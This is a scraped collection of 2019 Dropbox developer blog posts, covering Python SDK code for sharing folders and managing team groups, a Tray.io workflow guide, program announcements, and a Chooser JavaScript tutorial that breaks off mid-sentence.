creating a shared folder: Copy def creating_shared_folder(folder_path, access_level, email, message):\r\n    dbx.files_create_folder(folder_path)\r\n    # sharing_folder = dbx.sharing_share_folder(folder_path, force_async=True)\r\n    sharing_folder = dbx.sharing_share_folder(folder_path)\r\n    if sharing_folder.is_complete():\r\n        sharing_folder_data = sharing_folder.get_complete()\r\n    if sharing_folder.is_async_job_id():\r\n        async_job_id = sharing_folder.get_async_job_id()\r\n        # helper function will block until async sharing job completes\r\n        retry_sharing_job(async_job_id)\r\n        sharing_folder_job = dbx.sharing_check_share_job_status(async_job_id)\r\n        sharing_folder_data = sharing_folder_job.get_complete()\r\n \r\n    member = dropbox.sharing.MemberSelector.email(email)\r\n    add_member = dropbox.sharing.AddMember(member, access_level)\r\n    members = [add_member]\r\n    dbx.sharing_add_folder_member(sharing_folder_data.shared_folder_id, members, custom_message=message)\r\n    print(f\"Folder successfully created and shared with {email}.\")\r\n \r\ncreating_shared_folder(\r\n    '/students/Amy',\r\n    dropbox.sharing.AccessLevel.editor,\r\n    'TeacherFriend@college.edu',\r\n    'This is the message they will see'\r\n) You’ve created this functionality by stringing together a series of calls. First you create the folder , share the folder *, and add a member to the shared folder. *Important note: the folder share may happen asynchronously, in which case it will return an async_job_id instead of complete . In our sample, we’re addressing that with some simple retry logic: Copy def retry_sharing_job(async_job_id):\r\n    sharing_job = dbx.sharing_check_share_job_status(async_job_id)\r\n    if sharing_job.is_complete():\r\n        print(\"Async sharing job completed...\")\r\n        pass\r\n    else:\r\n        print(\"Async sharing job in progress\")\r\n        print(\"....waiting 3 seconds...\")\r\n        time.sleep(3)\r\n        retry_sharing_job(async_job_id) Using a folder gives you the benefit of being able to add other files later (such as their grades or other assignments) without needing to go through the sharing process again. There are four parameters you’ll want to set when sharing a folder with this function: 1. folder_path – The name and path to the folder. In this example, this could be ‘/students/Amy’. Make sure to start the path with a slash 2. access_level – The access level of the person you’re sharing the folder with. Perhaps you want the students to be able to turn in a reflection to their folder, so you set the access as editor. 3. email – The person’s email, such as ‘Amy@College.edu’ 4. message – The message they will see when you share it with them. This way they aren’t confused why they suddenly see a folder with their name in it. Perhaps something along the lines of ‘Here’s the notes and video from your thesis presentation’ If you have a list of your students’ names and emails you can loop through all them as well and really speed up the process: Copy students = [('Amy', 'Amy@College.edu'), ('Bill', 'Bill@College.edu'), ('Chad', 'Chad@College.edu')]\r\n \r\nfor name, email in students:\r\n    creating_shared_folder(f'/students/{name}', dropbox.sharing.AccessLevel.editor, email, 'Here is your talk') Automate Your Link, File, and Folder Sharing We covered several different ways to share using the Dropbox API: A shared link is a great choice to provide view-only access to non-Dropbox users and can be configured with extra settings like password and expiration. If the recipient is a Dropbox user, then you can directly share access to the file —giving your collaborator the ability to view and comment on the file. Sharing a folder with a Dropbox user is a great way to have a collaborative space to work from shared resources. Whether you’re a professor reviewing research, a manager organizing one-on-one notes, or a team member working on company announcements, you likely have collaborators. Use these sharing methods to improve how you collaborate and work with others. See what is possible with the Dropbox API and find other ways to automate your work. Please keep an eye out for a followup article where we’ll explore an interesting set of features available for Dropbox Business users, Teams and Groups . Build with Dropbox today at www.dropbox.com/developers // Tags Developers User endpoints Sharing Python Tips and Tricks // Copy link Link copied Link copied", "date": "2019-09-19"},
{"website": "Dropbox", "title": "Manage team sharing in your Dropbox App", "author": ["Taylor Krusen"], "link": "https://dropbox.tech/developers/manage-team-sharing-in-your-dropbox-app", "abstract": "Creating an App with Team member management access Organizing your new students Administering student accounts Sharing folders with groups Sharing links in a team setting Team managed shares Add sharing to your team-linked Dropbox app today! Welcome back, professor. This article is a follow-up to “ 3 ways to add sharing to your Dropbox App ”. We’re going to dive deeper into more advanced sharing use cases that are possible with the Dropbox API. Let’s get to it. As you may remember, you’re a professor for a large university. Besides teaching, you run a multifaceted research lab. It’s a busy job, but with some creative use of the Dropbox API, you’re able to spend most of your time focused on the parts you enjoy. That’s because Dropbox Business accounts allow you to closely manage team sharing. Creating an App with Team member management access There are four distinct Business access types outlined in the the Access types section of the Dropbox Business API documentation . You can start with team member management , which will allow you to sort professors, teaching assistants, and students into groups to easily control file access for the entire lab. 1. Create a new app from your App console 2. Select ‘Dropbox Business API’ 3. Select ‘Team member management’ 4. Name your app and click ‘Create app’ 5. Click ‘Generate access token’ and copy the token into your app Copy team_member_token = 'your_team_member_management_token'\r\ndbx_team_members = dropbox.DropboxTeam(team_member_token) Organizing your new students Your research lab consists of one giant team split into many smaller groups of students. The whole lab has some files they need to share, but each respective groups need more granular control over their specific files and file access. Adding students to team A new wave of students joined your lab for the fall semester. Inviting each student to your Dropbox Business team is a good place to start: Copy students = [('Amy', 'Smith', 'Amy@college.edu'), ('Bill', 'Jones', 'Bill@college.edu', 'Varna', 'Patel', 'Varna@college.edu')]\r\nstudents_to_add = []\r\nfor first_name, last_name, email in students:\r\n    member = dropbox.team.MemberAddArg(\r\n        member_email=email, \r\n        member_given_name=first_name,  \r\n        member_surname=last_name, \r\n        send_welcome_email=True\r\n    )\r\n    students_to_add.append(member)\r\nteam_add_request = dbx_team_members.team_members_add(students_to_add)\r\nprint(team_add_request) Note: we’re using the /team/members/add endpoint Sorting students into groups The lab work is split up into distinct groups so students can focus on one area at a time. This is an excellent use case for the Dropbox groups feature because, after they’re sorted, whole groups of students can be referenced by a group_id . During the first class of the semester students choose their preferred groups. One of the most popular groups is the Field Research Group, which will be doing lots of hands-on research. First, you create the new group with a group_external_id , which is an optional field used to define your own key: Copy create_request = dbx_team_members.team_groups_create(\r\n    group_name='Field Research Group', \r\n    group_external_id='field_research_group_fall_2019'\r\n)\r\nprint(create_request) Next, you add a teaching assistant as the designated owner for each respective group so they’re able to add or remove members in case students move between groups: Copy selected_group = dropbox.team.GroupSelector.group_external_id('field_research_group_fall_2019')\r\nselected_user = dropbox.team.UserSelectorArg.email('Paul+TA@college.edu')\r\n# access_type defaults to viewer if left blank\r\nselected_access_type = dropbox.team.GroupAccessType.owner\r\nmember_access = dropbox.team.MemberAccess(\r\n    user=selected_user,\r\n    access_type=selected_access_type\r\n)\r\nowner_add_request = dbx_team_members.team_groups_members_add(\r\n    group=selected_group,\r\n    members=[member_access]\r\n)\r\nprint(owner_add_request) Finally, you bulk add each group of the student to their chosen groups: Copy field_research_group = ['Amy@college.edu', 'Bill@college.edu']\r\nnew_group_members = []\r\nselected_group = dropbox.team.GroupSelector.group_external_id('field_research_group_fall_2019')\r\nfor member_email in field_research_group:\r\n    selected_user = dropbox.team.UserSelectorArg.email(member_email)\r\n    selected_access_type = dropbox.team.GroupAccessType.member\r\n    member_access = dropbox.team.MemberAccess(\r\n        user=selected_user,\r\n        access_type=selected_access_type\r\n    )\r\n    new_group_members.append(member_access)\r\n     \r\ngroup_add_request = dbx_team_members.team_groups_members_add(\r\n    group=selected_group,\r\n    members=new_group_members\r\n)\r\nprint(group_add_request) Note: managing users & groups requires the team member management permission. However, reading this information with /teams/members/list and /teams/groups/list only requires team information permission, allowing them to be used with any Dropbox Business application. Many teams use will manage users & groups in the Admin Console , identity management tool , or connector . In many cases your app may only need to read this data from Dropbox. Excellent! New students have been added to your Dropbox team, a teaching assistant was assigned to the Field Research Group as a group owner, and you’ve sorted students into their own respective groups (like the Field Research Group). Administering student accounts Dropbox Business team administrators may sign in as members of their team to organize accounts and troubleshoot. Admin-authorized apps with Member file access permission may do so via API, and use the User Endpoints on behalf of specific members on the team. Creating an App with Team member file access 1. Create a second new app from your App console 2. Select ‘Dropbox Business API’ 3. Select ‘Team member file access’ 4. Name your app and click ‘Create app’ 5. Click ‘Generate access token’ and copy the token into your app Copy team_file_token = 'your_team_file_access_token Because you’re using a team-linked app, you’ll need to use the Dropbox-API-Select-User header in order to assume the role of a user to call Dropbox User Endpoints . The first thing you’ll need is a team_member_id : Copy user = dropbox.team.UserSelectorArg.email('Paul+TA@college.edu')\r\nmember = dbx_team_members.team_members_get_info([user])\r\nif member[0].is_member_info():\r\n    member_info = member[0].get_member_info()\r\n    team_member_id = member_info.profile.team_member_id\r\nprint(f'You grabbed {member_info.profile.name}s team member id:{team_member_id}') Now you can instantiate the Dropbox SDK to act on behalf of that user: Copy dbx_as_user = dropbox.DropboxTeam(team_file_token).as_user(team_member_id)\r\n# a quick test call to verify our assume user calls work:\r\nprint(dbx_as_user.sharing_list_folders()) If the above call was successful, you’re ready to start administering sharing! We’ll be using dbx_as_user to make calls in some of the upcoming example snippets. Sharing folders with groups Since all your students have been sorted, you can share folder access with an entire group at once instead of enumerating over all students! Members can also be added or removed from that group and the share will stay the same. There are two important pieces of information you need to grab in order to share a folder with a group. Note that the calls use different access types , and, accordingly, different access tokens . 1. group_id — unique to each group 2. shared_folder_id — unique to each shared folder To get the group_id for the Field Research Group you created earlier: Copy selected_group = dropbox.team.GroupsSelector.group_external_ids(['field_research_group_fall_2019'])\r\ngroups = dbx_team_members.team_groups_get_info(selected_group)\r\nif groups[0].is_group_info():\r\n    group = groups[0].get_group_info()\r\n    target_group_id = group.group_id\r\nprint(f'grabbed {group.group_name} with group id {target_group_id}') To get the shared_folder_id for the existing folder the Field Research Group will share: Copy shared_folders = dbx_as_user.sharing_list_folders()\r\nfor folder in shared_folders.entries:\r\n    # filter out your target folder by name\r\n    if folder.name == \"field_research_team_folder\":\r\n        target_shared_folder_id = folder.shared_folder_id\r\n        print(f'grabbed {folder.name}, shared folder id: {target_shared_folder_id}') Note: this snippet only works for an existing shared folder. An alternative would be /sharing/share_folder , which would create a new shared folder if one didn’t exist. Now you can grant the entire Field Research Group access to the shared folder and all content inside… without enumerating! Copy selected_group = dropbox.sharing.MemberSelector.dropbox_id(target_group_id)\r\n# leaving out access level defaults to viewer\r\ntarget_access_level = dropbox.sharing.AccessLevel.editor\r\nadd_group_member = dropbox.sharing.AddMember(\r\n    member=selected_group,\r\n    access_level=target_access_level\r\n)\r\ndbx_as_user.sharing_add_folder_member(\r\n    shared_folder_id=target_shared_folder_id,\r\n    members=[add_group_member]\r\n)\r\nprint(\"successfully shared to group\") Some other benefits of using group shares: Groups can be reused on multiple folders and at different access levels — making it much easier to control access in bulk. Adding or removing members to a group means they’re automatically included or removed from that group’s existing shares — greatly increasing ease of access and security when members join or leave . Granting shared folder access in bulk certainly saves a lot of time, but it’s not the only way to share files in Dropbox. Sometimes your students may prefer to use shared links . Sharing links in a team setting Creating team-only shared links After completing a major milestone, the Field Research Group compiled their research into a spreadsheet, which will be a useful resource for other groups in the lab. The spreadsheet should be visible to everyone else on the team (other groups) but not the outside world. You can do this by creating a team-only shared link . You create a shared link scoped to team-only access by calling /sharing/create_shared_link_with_settings with an extra parameter in the settings: Copy team_audience = dropbox.sharing.LinkAudience.team\r\nlink_settings = dropbox.sharing.SharedLinkSettings(audience=team_audience)\r\nfile_path = '/field_research_team_folder/field_data.xls'\r\nlink = dbx_as_user.sharing_create_shared_link_with_settings(\r\n    file_path=path,\r\n    settings=link_settings\r\n)\r\nprint(link) The team-only shared link worked great for a little while. Unfortunately, as the lab has grown in size students have become a little too careless about how they’re using shared links. You decide to lock things down a bit. Updating a folder’s sharing policy The Field Research Group often needs to share links to files with other members in the group, but you don’t want that content shared with other groups in the lab. Rather than relying on individuals to change that setting for themselves every time a shared link is created, you update the folder’s sharing policy . Note: in a team context, a shared folder can be owned by either a member or a team . As the owner, a team member can directly update a shared folder’s settings. However, for a shared folder owned by a team , the settings must be changed from the Admin Console. Imagine the Field Research Group’s shared folder was created by their teaching assistant, Paul. Since he’s the owner, you assume the role of Paul in order to update the folder’s sharing policy: Copy dbx_as_user = dropbox.DropboxTeam(team_file_token).as_user('pauls_team_member_id') Some variables used in the snippet below, Paul’s team_member_id and the target_shared_folder_id , are from code snippets in above sections. Now you can update the shared folder’s policy: Copy new_link_policy = dropbox.sharing.SharedLinkPolicy.members\r\npolicy_update_request = dbx_as_user.sharing_update_folder_policy(\r\n    shared_folder_id=target_shared_folder_id, \r\n    shared_link_policy=new_link_policy\r\n)\r\nprint(policy_update_request) With this policy in place, new shared links created by students in the Field Research Group can only be accessed by other members of their shared folder. Updating a folder’s shared link policy solves a second major challenge: shared links that are difficult to detect from your app . Because shared links to the same content are unique to each user, it can be a lot of work to retrieve them. By enforcing shared link creation at a policy level, you’ve ensured that student’s links will be created in a consistent way and you can look for them within your app. Team managed shares While organizing your courses this semester, you learned that Dropbox Business has team folders. Team folders allow the administrator to create folders and share with a group. Within the team folder, you can create additional nested shares to add or remove additional users. When members are added to a group, the new member has access to that group’s existing shares. This enables you to take a folder structure like ‘/Field_Research/Lab Reports Spring 2020’ – and give the ‘Field_Research’ folder a different set of policies than the nested ‘Lab Reports Spring 2020’ folder. The ‘Field_Research’ folder may be read only for students for assignments, but the nested ‘Lab Reports Spring 2020’ be read-write for students to submit work. The Dropbox Business APIs & headers will let you manage these team shares similar to standard user shares. There are two types of managed team folders: Team Folders or Team Space . Which type is available depends on your account. You can determine which type of account you’re on by checking visually (purple folder in your home directory means you’re on team space): Your name will appear under a purple folder like this inside a team space Or you can check programmatically using the API: Copy team_features = dropbox.team.Feature.has_team_shared_dropbox\r\nis_team_space = dbx_team_members.team_features_get_values([team_features])\r\nprint(is_team_space) If has_team_shared_dropbox resolves to True , then you’re using Dropbox team space! There are some differences between the two team models: Team Folders Team Folders can be created with /team/team_folder/create and their membership managed with the sharing endpoints as described above. Team folders automatically appear inside individual member’s home directories. Team Spaces Team managed shares are created in the team’s root space, using the /sharing/add_folder_member/ endpoint. Each individual members directory is mounted inside the shared team space. API callers will need to set the Dropbox-API-Path-Root header in order to read from & write to the team root space. Regardless of which team account you are on, there are two behaviors shared by both patterns: 1. The folder is owned by a team (rather than member owned) so managing the creation, membership, or policies of these top level folders requires a Dropbox-API-Select-Admin header. 2. Users may create shares within these shares . By default, permissions are inherited , but the permission inheritance may be disabled. This opens some interested use cases for restrictive access control lists, or rACLs, which we’ll cover in the next blog post. Calling the Dropbox API in a Team Space Because your class is in a team space, there are a couple additional steps you need to take in order to update the 'Lab Reports Spring 2020' folder policy: 1. You need to use the Dropbox-API-Select-Admin header to perform the action as an admin. You’ll need an admin’s account_id : Copy team_list = dbx_team_members.team_members_list()\r\nfor member in team_list.members:\r\n    if member.role.is_team_admin():\r\n        selected_admin = member.profile.account_id\r\n        break Note: this snippet grabs the first admin from your list of team members. A production app may instead specify the admin by email or team_member_id . 2. You’ll also need to set the root directory to the shared team space, which you can do by setting the Dropbox-API-Path-Root header. Grab the root_namespace_id of the shared team space: Copy account_info = dbx_as_user.users_get_current_account()\r\nroot_namespace_id = account_info.root_info.root_namespace_id\r\nteam_root_namespace = dropbox.common.PathRoot.namespace_id(root_namespace_id) Note: we’re selecting a user and getting current account info to find the root_namespace_id. With those two variables set, you instantiate the Dropbox SDK as an admin and with a specific root folder (namespace): Copy dbx_as_admin_team_root = dropbox.DropboxTeam(team_file_token).with_path_root(team_root_namespace).as_admin(selected_admin) Finally, you can update the folder’s sharing policy: Copy # Note: we're using the Dropbox-API-Select-User header to list folders\r\nshared_folders = dbx_as_user.sharing_list_folders()\r\nfor folder in shared_folders.entries:\r\n    if folder.name == \"Lab Reports Spring 2020\":\r\n        student_reports_folder = folder.shared_folder_id \r\n \r\nnew_link_policy = dropbox.sharing.SharedLinkPolicy.anyone\r\n# Note: now we're using the Select-Admin and Path-Root header to update the policy\r\npolicy_update_request = dbx_as_admin_team_root.sharing_update_folder_policy(\r\n    shared_folder_id=student_reports_folder, \r\n    shared_link_policy=new_link_policy\r\n)\r\nprint(policy_update_request) Hooray! You successfully updated the shared link policy for the ‘/Field_Research/Lab Reports Spring 2020’ folder. Add sharing to your team-linked Dropbox app today! The Dropbox API offers a great way to take control of how your files are shared and accessed. Combined with the features available to Dropbox Business teams, the Dropbox sharing APIs can save valuable time, streamline the sharing of content, and directly control the level of access applied to files and folders. Whether you’re managing a sales team, building an automated process for a digital design company, or a professor managing a multifaceted research lab, sharing can add a lot of value to your Dropbox App. For additional technical information and guidance on this topic, we recommend reading our Namespace Guide , Content Access Guide , or the Business API Documentation . Keep an eye out for the next sharing article where we dive into rACLs and inherited permissions. If you have any questions about this article or need help with anything else, you can always contact us here . Build with Dropbox today at www.dropbox.com/developers // Tags Developers User endpoints Sharing Python Tips and Tricks Business Endpoints Teams // Copy link Link copied Link copied", "date": "2019-11-20"},
{"website": "Dropbox", "title": "Automating File Request Workflows using Tray.io", "author": ["Abhishek Lahoti"], "link": "https://dropbox.tech/developers/automating-file-request-workflows-using-tray-io", "abstract": "Workflow: Create/Send File Request Workflow: Send Reminder Email Automate Your Workflows with Tray.io Previously in our blog, we described how to Streamline File Collection by using the file request endpoints in our API, however you don’t have to write a full integration to take advantage of the API! Dropbox recently announced a partnership with Tray.io , a flexible General Automation Platform that lets users integrate and automate their business processes. As a developer, building automation workflows on the Tray Platform can save hours of manual work or custom app development. Let’s say it’s 9:05 AM on Tuesday, and you just realized that yet again, you have to collect reports from your team. Since you do this twice a week, you’re quite familiar with the process. You open up Dropbox to create a File Request so that every report can be submitted and stored in a single location. This is easy enough from the Dropbox interface, but doing the same task every Monday is getting repetitive. Following the same series of clicks you do every week, you create the request. As you continue sipping your morning coffee, you begin to plan tomorrow’s tedious task of sorting through the pile of file request submissions. You think to yourself, there must be a better way to collect and organize these files every week . Yes, there is. In order to automate this process, you first need to determine your specific needs. Let’s assume your process is relatively straightforward, and you have this basic set of requirements: Each week on Tuesday and Thursday morning, you want to send your team a File Request. They tend to be busy so you’d like to send a reminder email on both days. Requirements: two workflows run each week on Tuesday and Thursday. At 9:00 AM a file request is sent to the team. At 4:00 PM a reminder email is sent to the team. Although the requirements are straightforward, they still pose interesting (and not always trivial) problems to be solved by a developer, namely: A scheduled trigger must execute code twice a day for two days of the week. The file request naming conventions are often unique and change constantly. We want to organize them in a way that will be useful in the future. An up-to-date list of team members needs to be maintained to send the recurring file requests and reminders. These problems can be solved individually with the file request API , but tying them all together in a seamless workflow is where it can get challenging. With the Tray Platform, however, this becomes two concise workflows with a couple of pre-built connectors. To get a head start, let’s use the pre-built workflows* Tray.io has created on your behalf. *Please contact the author for help accessing the pre-built workflows. You must have a Tray account. In our example, the first workflow is named “Create/Send File Request” and the second workflow is named “Send Reminder Email.” Workflow: Create/Send File Request In the first workflow, we start with a Scheduled Trigger. The Tray Platform has many different types of trigger operations available. In this case, the Scheduled Trigger allows us to configure the workflow to our requirement using the ‘Every Day’ operation at 9:00 AM on Tuesday and Thursday. The Tray.io builder canvas: The green box on the left is the Connectors Library, the section in blue is the Canvas, and the yellow section is the Parameters pane. The next operation in the workflow is a mustache template (learn more about Mustache Templates in the Tray docs) named Format Folder Title . It is responsible for creating a custom folder title for that day’s respective request. This operation adds clarity to the overall workflow and allows users to quickly edit the format of this folder title at a later time. New parameters can be added to the mustache template by following these steps: Click the ‘Add Property to Parameters” button Give your property a name Inside the Template Code input, use a mustache reference {{property_name}} anywhere you need to access your new variable Parameters in the Format Folder Title operation of the workflow In the next connector, Create File Request Folder , we’re creating a new folder on Dropbox titled ‘ Weekly File Request – {{month}}/{{day}}/{{year}} ’ where the month, day, and year values come from the scheduled trigger. The date and folder path are used as parameters for the Create File Request connector, which uses the Dropbox API to create a hyperlink for our file request. A second mustache template, Email Body Template , allows us to define what our co-workers receive in the body of their email so we can include the file request link. The final step, Distribute File Request is where you can build your list of co-workers that you need to send out emails to. In addition to the list of recipients, the Send Email connector also allows you to configure the email address that the request link is sent from, which is where replies to the email will go. After configuring these email addresses, the workflow is complete! Workflow: Send Reminder Email The email reminder workflow is less complex and can reuse most of the information from our first workflow! We start by duplicating the Create/Send File Request workflow, but remove all operations except the Scheduled Trigger, one Mustache Template, and the Send Email connector. The Tray.io builder canvas for the Send Reminder Email workflow: The green box on the left is the Connectors Library, the section in blue is the Canvas, and the yellow section is the Parameters pane. First, we edit the Scheduled Trigger start time to be 1600 hours (or 4:00 PM). The Format Subject mustache template is used to set the subject line, “Reminder to Submit File Request for {{day}}/{{month}}/{{year}} ”. Finally, the Send Email connector uses the same recipient list and sender address from our first workflow, but we hardcode the email body as a reminder to respond to that day’s file requests. Automate Your Workflows with Tray.io With just two concise workflows in Tray.io, we’ve created a basic reporting system that automatically sends Dropbox file requests and reminder emails to our team each week. By abstracting some of the low level complexities away from the user, we’ve given them back some valuable bandwidth to focus on other challenges. Furthermore, because Tray.io is a low-code solution, building automated processes like the one in our example is accessible to users with lower levels of technical expertise. Learn more about how you can automate with Tray.io by joining their technical weekly demo . Whether you’re working directly with the Dropbox file request API to streamline file collection like we outlined in a previous blog post or working with a Dropbox Technology Partner like Tray.io as described above, Dropbox file requests help you automate repeat tasks of collecting and organizing files from anyone, right in your Dropbox account. If you need help with anything else, you can always contact the Dropbox team via our web form , developer forums , or on twitter . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Workflow Automation Partners Tips and Tricks File Requests Developer Spotlight // Copy link Link copied Link copied", "date": "2019-08-26"},
{"website": "Dropbox", "title": "Grow your business as a Dropbox Technology Partner", "author": ["Jessica Berg"], "link": "https://dropbox.tech/developers/grow-your-business-as-a-dropbox-technology-partner", "abstract": "Program benefits How to apply W e ’re excited to announce the launch of our new Dropbox Technology Partner Program . We expanded our program to include three partner tiers and added a variety of new benefits. Better yet - it’s free to join. We created the Dropbox Technology Partner Program to team-up with innovative companies to help our 500 million users and 400,000 teams work more seamlessly across best-of-breed tools and solutions. By building and partnering with Dropbox, you can deepen your product offering, expand your customer reach, and create more value for your users. Program benefits As a Dropbox Technology Partner, you’ll receive benefits that help develop, market, and grow your business . Program benefits vary by tier but can include: Free Dropbox Business sandbox accounts for additional development, testing, and sales demo purposes Presence on the Dropbox App Showcase Eligibility to be featured in Dropbox marketing campaigns Access to marketing materials and templates Lead referral program for a 10% referral fee* Program newsletters & communications Technical support from the Dropbox team View the full list of program benefits here . * Separate agreement and conditions apply. How to apply The Dropbox Technology Partner Program encompasses three partner tiers. To be considered, applicants must meet the following requirements: Developers interested in the new Dropbox Technology Partner Program can learn more and apply here . If you don't yet meet the requirements to apply for the program today, we're still here to support you as a Dropbox developer. Check out our support resources, events, and community engagement opportunities here . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Announcements Partners // Copy link Link copied Link copied", "date": "2019-07-10"},
{"website": "Dropbox", "title": "Introducing Developer Build Program, first stop – Austin", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/developer-build-program-austin", "abstract": "If you’re from a startup, then you know that interacting with your customers ’ files takes a lot of effort. Why not tap into that functionality from a brand trusted by over 500 million users? Spend your time creating value for your users instead of building a filesystem by integrating with Dropbox . With the Dropbox APIs, you can access, work with, and share Dropbox content with your users right within your product, and we’ll teach you how. The Dropbox Developer Build Program was created by developers for developers to help you build and launch your Dropbox integrations faster. We’re inviting startups in Austin to apply to be part of the first class of the Dropbox Developer Build Program. The program kicks off with an in-person event on Wednesday, July 31 in Austin , including: Sessions from the Dropbox and HelloSign team to teach you everything you need to know about building with our APIs A half-day interactive coding session to start building with examples of common use cases, like file access and sharing. Plenty of time with the Dropbox technical teams to ask questions about security or performance, troubleshoot errors, remove roadblocks, and discuss use cases A discussion with the Moleskine team about how they build their Dropbox integration Head to our event page to see the full agenda for the Dropbox Developer Build Day in Austin and apply to attend. Following the in-person event, the program will continue with opportunities to work with the Dropbox team to get your integration launched. You should apply if you're a startup with an app or use case that works with files but have not yet built (or completed building) your integration with Dropbox. If accepted into the program, you and your team will be invited to join the first Developer Build Day on Wednesday, July 31 in our Austin office for lots of learning, food, and fun. The deadline to apply for the first Build Day is July 3rd. We are accepting a limited number of applicants on a rolling basis in order to keep the event small and impactful. APPLY NOW If you’re not based in Austin, subscribe to our blog or follow us on Twitter for future announcements of the Dropbox Developer Build Program launching in a city near you. Come build apps that power content and collaboration with Dropbox! // Tags Developers Announcements Austin Workshop Dbx Build Day // Copy link Link copied Link copied", "date": "2019-06-20"},
{"website": "Dropbox", "title": "Quickly integrate file upload in your web app using the Chooser", "author": ["Jj121217"], "link": "https://dropbox.tech/developers/quickly-integrate-file-upload-in-your-web-app-using-the-chooser", "abstract": "Step 1: Create Your Dropbox App Step 2: Integrate the Chooser into your App Step 3: Customize Chooser to Your Needs Potential Enhancements File upload from a web browser can be a hassle for both the developer and the end user. By integrating with Dropbox, you can help your users easily get to their files stored in Dropbox and streamline uploads into your app without the need for error handling or multipart form data with backend code. The Dropbox Chooser is an easy-to-implement, pre-built component that allows users to access their Dropbox files from within your app. Simply include our JavaScript snippet to add a file-browsing UI and handle authentication to a users’ Dropbox account. This post will cover the three simple steps to add Dropbox Chooser to your website or application. Step 1: Create Your Dropbox App Anything developers build on Dropbox need s to connect through a Dropbox a pp . If this is your first time creating a Dropbox app, head to our step-by-step setup wizard in the App Console , which will guide you through creating your Dropbox app. Your Dropbox app has a unique app key that can be used (along with the app secret) to generate access tokens for making calls to the Dropbox API by implementing an OAuth flow . The Chooser helps you access files selected by a user without requiring a deep integration through OAuth, though you can certainly use the Chooser in combination with calls directly to the API to build more complex integrations. Chooser itself can be implemented with any app permission level. While the user will be able to browse their entire Dropbox account with the Chooser , your app will only have access to the files explicitly selected by the user. You can read more about app permissions for Chooser here . Chooser also u ses your unique app key to identify your a pp to Dropbox. To do this , you’ll need to include the Dropbox app k ey within your HTML in the next step . For now, let’s grab the app key from the “app settings” page within the App Console . Before moving on to the next step, add your application’s domain name into the “ Chooser/Saver domains ” field in your app settings within the App Console. This keeps other websites from impersonating your app. You can also add the site to your “app settings” later — you’ll be able to test locally without it . Step 2: Integrate the Chooser into your App With our Dropbox app prepared, we’re ready to add Chooser into our website or app. For this example, we’ll use some basic HTML and JavaScript to show what’s possible. You can also access basic Chooser set up instructions on the Dropbox developer website . To get started, copy and paste this boilerplate into a new HTML file: Copy <!DOCTYPE html>\r\n<head>\r\n        <meta charset=\"UTF-8\"/>\r\n        <title>Chooser JS Integration Example</title>\r\n        <script type=\"text/javascript\" \r\n                src=\"https://www.dropbox.com/static/api/2/dropins.js\" \r\n                id=\"dropboxjs\" \r\n                data-app-key=\"YOUR-APP-KEY\">\r\n        </script>\r\n</head>\r\n<body>\r\n        <h1>An Example of a Minimal Integration of Dropbox's Chooser JS</h1>\r\n        <div id=\"dropboxContainer\"></div>\r\n        <script src=\"custom.js\"></script>\r\n</body>\r\n</html> There are a couple things to note here. First, the tag loads the Chooser from Dropbox. Be sure to replace YOUR-APP-KEY with the app key you grabbed from the App Settings page in the previous step. We also have an empty  and a call to a custom JavaScript file. We need to create that file (custom.js) and connect the to Chooser. Again, here’s some boilerplate JavaScript. Copy it into a new file named `custom.js`: Copy options = {\r\n        success: function(files){\r\n         \r\n        },\r\n        cancel: function(){\r\n                 \r\n        },\r\n};\r\nvar button = Dropbox.createChooseButton(options);\r\ndocument.getElementById(\"dropboxContainer\").appendChild(button); Here we create a new button by calling Dropbox’s createChooseButton function. We’ve passed a very basic options variable, which we’ll improve upon later. Next, we insert the button into the page by referencing the <div> in our HTML. Save your files in the same directory and load them up using a local web server of your choice; you will receive errors if you try to load them directly in your browser. Here is an example using express , a lightweight web framework for Node.js: Run   in your terminal. * You’ll need npm (node package manager) to use this particular sample. Create a ‘server.js’ file and add the following code: Copy var express = require('express');\r\nvar app = express();\r\n// use line below if html file is in root directory\r\napp.use(express.static(__dirname));\r\n// use line below if html file is in nested folder\r\n// app.use(express.static(path.join(__dirname, 'public')));\r\napp.get('/', function(req, res) {\r\n    res.render('index.html');\r\n});\r\napp.listen(8000)\r\nconsole.log('Server listening on localhost:8000'); 3. Run your server with a node server.js command. You’ll have a page with a simple button that browses Dropbox files with very minimal code. In the next step, we’ll do something with the selected files. Step 3: Customize Chooser to Your Needs Dropbox Chooser is meant to support multiple use cases where you might otherwise need a direct file upload. However, since you don’t have to handle the bytes directly, some uses won’t even need a back-end at all. Your success function (empty in our previous example) will get an array of files, each with data about the file, such as the name and link . See the Chooser documentation for the full list of available fields . For this example, we’ll help users email PDF documents for others to review. This could be integrated as a lightweight publishing step within a workflow, where co-workers, or others involved with the project, would receive the email with preview links. To do this, we will only need the name and link fields. To ensure this process is smooth, we will modify our options parameter by including several fields, as well as adding some code to the success function. Replace the previous `custom.js` file with the following JavaScript: Copy options = {\r\n        success: function(files){\r\n                send_files(files);\r\n        },\r\n        cancel: function(){\r\n        },\r\n        linkType: \"preview\",\r\n        multiselect: true,\r\n        extensions:['.pdf'],\r\n};\r\nvar button = Dropbox.createChooseButton(options);\r\ndocument.getElementById(\"dropboxContainer\").appendChild(button); We’ve set the linkType to preview to provide the user a preview link to the document for sharing. While this approach is useful for an end user, you’ll want to use the direct option if you intend to transfer the file to a backend. There are a couple of other Chooser options we’re using. First, we set the multiselect field to true , which allows users to choose more than one file. Secondly, we limited our extensions to .pdf only —you can include multiple extensions as strings in the array, or remove the option to allow any file type. The success function now calls to another function, send_files() , which will process the PDFs the user selects in the Chooser interface. Add this additional JavaScript to the bottom of your `custom.js` file: Copy function send_files(files) {\r\n        var subject = \"Shared File Links\";\r\n        var body = \"\";\r\n        for(i = 0; i &amp;amp;amp;amp;lt; files.length; i++){\r\n                body += files[i].name + \"\\n\" + files[i].link + \"\\n\\n\";\r\n        }\r\n        location.href = 'mailto:coworker@example.com?Subject='+ escape(subject) + '&amp;amp;amp;amp;amp;body='+ escape(body),'200','200';\r\n} Our JavaScript function first sets a subject for the email, which we’ll use to send the links to the user’s PDF files. The for loop goes through all the files from the Chooser, getting the name of the file and the link to the file on Dropbox. Finally, we construct the mailto link (note the email address), being sure to escape the subject and body so all the data will make its way to our local email program. Restart your localhost server and load up the HTML file in your browser. After choosing files, you’ll be ready to send the email, with the links pre-filled into the body of your message. Potential Enhancements In today’s mobile work environment, quick and easy file management through cloud services is essential for streamlined project communication. Dropbox’s Chooser gives developers a hassle-free component that easily integrates within their web applications, while providing the user an intuitive file 